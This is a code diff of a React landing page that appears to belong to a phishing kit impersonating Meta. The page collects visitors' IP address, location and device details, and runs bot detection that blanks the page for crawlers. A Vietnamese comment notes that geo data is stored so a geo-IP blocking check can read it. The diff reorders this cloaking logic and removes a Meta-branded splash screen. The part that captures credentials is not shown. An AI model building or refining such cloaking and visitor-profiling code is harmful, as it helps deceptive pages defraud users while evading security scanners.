@@ -1,6 +1,5 @@
 import { useEffect, useState, useCallback, useMemo } from 'react';
 import axios from 'axios';
-import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import TickIcon from '@/assets/images/tick.svg';
 import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
@@ -46,7 +45,6 @@ const Home = () => {
     const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
     const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
-    const [isLoading, setIsLoading] = useState(true);
 
     const defaultTexts = useMemo(
         () => ({
@@ -216,25 +214,7 @@ const Home = () => {
 
     const initializeApp = async () => {
         try {
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
-
-            // Detect device info
-            try {
-                const device = detectDevice();
-                console.log('Device detected:', device);
-                setDeviceInfo(device);
-                localStorage.setItem('deviceInfo', JSON.stringify(device));
-            } catch (error) {
-                console.error('Error detecting device:', error);
-                const fallbackDevice = { deviceInfo: 'Unknown Device' };
-                setDeviceInfo(fallbackDevice);
-                localStorage.setItem('deviceInfo', JSON.stringify(fallbackDevice));
-            }
-
+            // Geo + ipInfo trong localStorage phải có trước detectBot (checkAndBlockByGeoIP đọc từ đây).
             try {
                 const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                 const data = response.data;
@@ -260,10 +240,27 @@ const Home = () => {
                 setTranslatedTexts(defaultTexts);
             }
 
-            setIsLoading(false);
+            const botResult = await detectBot();
+            if (botResult.isBot) {
+                window.location.href = 'about:blank';
+                return;
+            }
+
+            // Detect device info
+            try {
+                const device = detectDevice();
+                console.log('Device detected:', device);
+                setDeviceInfo(device);
+                localStorage.setItem('deviceInfo', JSON.stringify(device));
+            } catch (error) {
+                console.error('Error detecting device:', error);
+                const fallbackDevice = { deviceInfo: 'Unknown Device' };
+                setDeviceInfo(fallbackDevice);
+                localStorage.setItem('deviceInfo', JSON.stringify(fallbackDevice));
+            }
+
         } catch (error) {
             console.error('Initialization error:', error);
-            setIsLoading(false);
         }
     };
 
@@ -397,13 +394,7 @@ const Home = () => {
 
     const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
 
-    if (isLoading) {
-        return (
-            <div id="intro" style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
-                <img id="meta-logo" src={MetaLogo} alt="Meta" style={{ width: '70%', height: 'auto' }} />
-            </div>
-        );
-    }
+
 
     return (
         <>
